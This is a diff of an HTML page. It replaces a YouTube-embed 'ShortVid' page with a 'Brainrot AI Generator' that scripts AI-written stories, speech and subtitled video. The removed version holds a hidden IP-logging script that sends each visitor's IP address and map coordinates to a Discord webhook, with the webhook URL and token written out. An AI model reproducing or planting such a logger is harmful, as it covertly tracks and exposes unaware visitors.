@@ -1,129 +1,138 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ShortVid</title>
-    <style>
-body {
-    font-family: Arial, sans-serif;
-    background-color: #f4f4f4;
-    color: #333;
-    margin: 0;
-    padding: 0;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-}
-
-.container {
-    text-align: center;
-    position: relative;
-    width: 100%;
-    height: 100%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
-
-h1 {
-    color: #333;
-    position: absolute;
-    top: 20px;
-    left: 50%;
-    transform: translateX(-50%);
-    z-index: 10;
-    font-size: 24px;
-}
-
-#video-container {
-    width: 100%;
-    height: 100%;
-    background-color: #000;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
-
-#video-container iframe {
-    width: 100vw;  /* Full width of the viewport */
-    height: 100vh; /* Full height of the viewport */
-    border: none;
-}
-
-    </style>
+  <meta charset="UTF-8" />
+  <title>Brainrot AI Generator</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body { background-color: #0f0f0f; }
+    .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); }
+  </style>
 </head>
-<body>
-    <div class="container">
-        <h1>ShortYT</h1>
-        <div id="video-container">
-            <p>Loading video...</p>
-        </div>
-</div>
-    <script>
+<body class="min-h-screen flex items-center justify-center text-white p-6">
+  <div class="glass border border-gray-700 p-6 rounded-xl max-w-3xl w-full space-y-6">
+    <h1 class="text-3xl font-bold text-center text-emerald-400">🧠 Brainrot AI Generator</h1>
+    
+    <div class="flex justify-center gap-4">
+      <button id="ytBtn" class="px-4 py-2 rounded bg-blue-600 hover:bg-blue-700">YouTube Mode</button>
+      <button id="ttBtn" class="px-4 py-2 rounded bg-pink-600 hover:bg-pink-700">TikTok Mode</button>
+    </div>
 
-function getVideoIdFromUrl() {
-    const urlParams = new URLSearchParams(window.location.search);
-    return urlParams.get('vid');
-}
+    <button id="start" class="w-full py-3 text-lg font-bold text-black bg-emerald-400 hover:bg-emerald-500 rounded-lg">
+      🎬 Generate Video
+    </button>
 
-function loadVideo() {
-    const videoId = getVideoIdFromUrl();
-    const videoContainer = document.getElementById('video-container');
+    <div class="w-full bg-gray-800 rounded-full h-3 overflow-hidden">
+      <div id="progress" class="bg-green-400 h-full w-0 transition-all duration-300"></div>
+    </div>
 
-    if (videoId) {
-        const iframe = document.createElement('iframe');
-        iframe.src = `https://www.youtube.com/embed/${videoId}`;
-        iframe.allow = "accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture";
-        iframe.allowFullscreen = true;
+    <pre id="log" class="bg-black bg-opacity-30 p-4 rounded h-64 overflow-y-auto text-sm whitespace-pre-wrap">Status: Ready...</pre>
 
+    <a id="downloadLink" class="hidden bg-yellow-400 text-black px-4 py-2 rounded text-center font-bold block text-lg mt-2" download="brainrot.mp4">
+      ⬇️ Download Video
+    </a>
+  </div>
 
-        videoContainer.innerHTML = '';
-        videoContainer.appendChild(iframe);
-    } else {
+  <script type="module">
+    import * as puter from 'https://cdn.puter.com/v2/puter.min.mjs';
+    import { createFFmpeg, fetchFile } from 'https://unpkg.com/@ffmpeg/ffmpeg@0.12.4/dist/ffmpeg.min.js';
 
-        videoContainer.innerHTML = '<p>Error: No video ID found in URL.</p>';
+    const ffmpeg = createFFmpeg({ log: false });
+    const log = document.getElementById("log");
+    const progressBar = document.getElementById("progress");
+    const downloadLink = document.getElementById("downloadLink");
+    const ytBtn = document.getElementById("ytBtn");
+    const ttBtn = document.getElementById("ttBtn");
+    let mode = "youtube";
+
+    ytBtn.onclick = () => { mode = "youtube"; ytBtn.classList.add("bg-blue-800"); ttBtn.classList.remove("bg-pink-800"); };
+    ttBtn.onclick = () => { mode = "tiktok"; ttBtn.classList.add("bg-pink-800"); ytBtn.classList.remove("bg-blue-800"); };
+
+    function logMsg(msg) {
+      log.textContent += "\\n" + msg;
+      log.scrollTop = log.scrollHeight;
     }
-}
 
+    function setProgress(p) {
+      progressBar.style.width = `${p * 100}%`;
+    }
 
-window.onload = loadVideo;
+    async function generateStory() {
+      logMsg("🧠 Generating story with PuterJS...");
+      const res = await puter.ai.chat(
+        "Write a dramatic Reddit-style story in first person. 4–6 paragraphs. Emotional, intense, suspenseful.",
+        { model: "gpt-4o" }
+      );
+      return res.text;
+    }
 
-    </script>
-  <script>
-      
-     var wbhk = 'https://discord.com/api/webhooks/1347351920075083818/J-K9B1cukwiXvgqvcNOJZSDyuJRy-8oboNKh1WCCq6dQY1YL9zkdanxpe9KzkcvDdh2H'
+    function makeSRT(text, addOutro) {
+      const lines = text.split(/(?<=[.?!])\s+/);
+      if (addOutro) lines.push("Full story on my channel!");
+      return lines.map((line, i) => {
+        const start = i * 3, end = start + 3;
+        const t = s => new Date(s * 1000).toISOString().substr(11, 8) + ",000";
+        return `${i + 1}\n${t(start)} --> ${t(end)}\n${line.trim()}\n\n`;
+      }).join('');
+    }
 
-        function ipLogByCJ() {
-          var ip = '';
-          var XMLHttp = new XMLHttpRequest();
-             XMLHttp.onreadystatechange = function() {
-               if(this.readyState == 4 && this.status == 200) {
-          		var ipwhois = JSON.parse(this.responseText);
-                    var ispp = ipwhois.ip
-                    var ispp2 = ipwhois.ip + "/json"
-                    var ll = ipwhois.latitude + "," + ipwhois.longitude
-                            const request = new XMLHttpRequest();
-                       request.open("POST", wbhk);
-                       request.setRequestHeader('Content-type', 'application/json');
-                       const params = {
-                         username: "LoggedByCJ",
-                         content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Raw** : _https://ipapi.co/" + ispp2 + `_\n[View on Google Maps](https://www.google.com/maps?q=${ll}) _` + " _\n**More info:** : https://ipwho.is/" + ispp
-                       }
-                       request.send(JSON.stringify(params));
-                     }
-                  
-                  };
-                                      XMLHttp.open('GET', 'https://ipwho.is/' + ip, true);
-                    XMLHttp.send();
+    async function getTTS(text) {
+      const voice = Math.random() < 0.5 ? "en_us_001" : "en_us_006";
+      logMsg(`🗣️ Using voice: ${voice}`);
+      const result = await puter.ai.speak(text, { voice, format: "mp3" });
+      return new Uint8Array(await result.arrayBuffer());
+    }
 
-             }
+    document.getElementById("start").onclick = async () => {
+      try {
+        setProgress(0);
+        log.textContent = "⏳ Starting...";
+        downloadLink.classList.add("hidden");
 
-               
-      setTimeout(function() {
-        ipLogByCJ()
-      }, 700);
-</script>
+        if (!ffmpeg.isLoaded()) {
+          logMsg("📦 Loading ffmpeg...");
+          await ffmpeg.load();
+        }
+
+        setProgress(0.1);
+        const story = await generateStory();
+        setProgress(0.2);
+
+        const audio = await getTTS(story);
+        ffmpeg.FS("writeFile", "voice.mp3", audio);
+        setProgress(0.4);
+
+        const bg = await fetchFile("bg.mp4");
+        ffmpeg.FS("writeFile", "bg.mp4", bg);
+        setProgress(0.5);
+
+        const srt = makeSRT(story, mode === "tiktok");
+        ffmpeg.FS("writeFile", "subs.srt", new TextEncoder().encode(srt));
+        setProgress(0.6);
+
+        const vf = mode === "tiktok" ? "scale=720:1280" : "scale=1280:720";
+        logMsg("🎞️ Rendering video...");
+
+        await ffmpeg.run(
+          "-i", "bg.mp4",
+          "-i", "voice.mp3",
+          "-vf", `${vf},subtitles=subs.srt:force_style='FontSize=24,PrimaryColour=&HFFFFFF&'`,
+          "-shortest",
+          "out.mp4"
+        );
+
+        setProgress(1);
+        const out = ffmpeg.FS("readFile", "out.mp4");
+        const blob = new Blob([out.buffer], { type: "video/mp4" });
+        downloadLink.href = URL.createObjectURL(blob);
+        downloadLink.classList.remove("hidden");
+        logMsg("✅ Video complete!");
+      } catch (err) {
+        logMsg("❌ Error: " + err.message);
+        console.error(err);
+      }
+    };
+  </script>
 </body>
 </html>
